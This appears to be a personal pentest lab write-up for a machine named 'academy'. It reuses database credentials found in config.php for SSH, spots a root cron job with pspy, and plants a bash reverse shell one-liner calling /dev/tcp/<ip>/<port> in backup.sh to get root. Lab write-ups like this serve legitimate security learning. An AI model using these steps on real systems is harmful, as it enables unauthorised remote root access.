---
aliases: 
tags:
  - tech
  - cybsec
  - penetration_testing
  - report
author: Mehdi N Tehrani
creat_date: 2023-12-04
category: Cyber Security
subcategory: Penetration Testing - Report
---

# linpeas
`/var/www/html/academy/includes/config.php`

```
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>
```


# Credentials
## grimmie
user: `grimmie`
pass: `My_V3ryS3cur3_P4ss`

used by:
- phpmyadmin
- unix user


Use credentials above to SSH into the victim's machine.
# 1. pspy script
https://github.com/DominicBreuker/pspy 
#pspy
Get all processes running from the moment pspy is run.
This captures short-lived processes. In this case, a cron job runs for a second which cannot be captured by other tools like *top*.
As the cron job is run by the root user - UID=0, updating the backup.sh script can run any process by root user
```
2023/12/04 22:47:01 CMD: UID=0     PID=27779  | /usr/sbin/CRON -f 
2023/12/04 22:47:01 CMD: UID=0     PID=27780  | /usr/sbin/CRON -f 
2023/12/04 22:47:01 CMD: UID=0     PID=27782  | /bin/sh -c /home/grimmie/backup.sh 
2023/12/04 22:47:01 CMD: UID=0     PID=27783  | /bin/bash /home/grimmie/backup.sh 
2023/12/04 22:47:01 CMD: UID=0     PID=27784  | /bin/bash /home/grimmie/backup.sh 
2023/12/04 22:47:01 CMD: UID=0     PID=27785  | /bin/bash /home/grimmie/backup.sh 
```

# 2. update backup.sh 
Update backup.sh file run by a cron job to contain a bash rev shell one-liner
the cron job is run 
## bash reverse shell one-liner
#bash #reverse_shell #one-liner
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
`bash -i >& /dev/tcp/<ip>/<port> 0>&1`

# 3. machine rooted
```
root@academy:~# whoami
whoami
root
```
